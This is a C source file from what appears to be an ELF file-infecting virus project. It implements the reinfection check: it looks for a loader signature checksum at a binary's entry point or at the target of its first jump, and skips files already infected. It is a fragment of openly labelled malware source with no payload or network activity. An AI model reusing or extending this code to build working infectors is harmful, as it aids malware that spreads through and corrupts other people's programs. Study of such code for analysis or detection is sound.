#include "virus.h"
#include "utils.h"
#include "jumps.h"
#include "errors.h"
#include "compiler_utils.h"

/*
** if current binary is already our client, don't infect again ! <3
*/
static bool		check_signature(const uint8_t *signature)
{
	if (checksum(signature, LOADER_PROLOGUE_LEN) == LOADER_PROLOGUE_SUM)
		return errors(ERR_VIRUS, _ERR_V_ALREADY_INFECTED);

	return true;
}

/* -------------------------------------------------------------------------- */

static bool	not_infected_jump(struct safe_ptr file_ref, size_t entry_offset)
{
	void	*client_first_jump = find_first_jump(file_ref, entry_offset);

	if (client_first_jump == NULL)
		return errors(ERR_THROW, _ERR_T_NOT_INFECTED_JUMP);

	void	*jump_destination = get_jump_destination(client_first_jump);

	const size_t	loader_offset = (size_t)jump_destination - (size_t)file_ref.ptr;
	const uint8_t	*signature    = safe(file_ref, loader_offset, LOADER_PROLOGUE_LEN);

	if (signature == NULL)
		return errors(ERR_VIRUS, _ERR_V_CANT_READ_SIGNATURE);

	return check_signature(signature);
}

static bool	not_infected_entry(struct safe_ptr file_ref, size_t entry_offset)
{
	const uint8_t	*signature = safe(file_ref, entry_offset, LOADER_PROLOGUE_LEN);

	if (signature == NULL)
		return errors(ERR_VIRUS, _ERR_V_CANT_READ_SIGNATURE);

	return check_signature(signature);
}

/* -------------------------------------------------------------------------- */

bool		not_infected(const struct entry *file_entry,
			struct safe_ptr file_ref)
{
	const Elf64_Off	sh_offset    = file_entry->safe_shdr->sh_offset;
	const size_t	entry_offset = sh_offset + file_entry->offset_in_section;

	if (!not_infected_entry(file_ref, entry_offset)
	|| !not_infected_jump(file_ref, entry_offset))
		return errors(ERR_THROW, _ERR_T_NOT_INFECTED);

	return true;
}
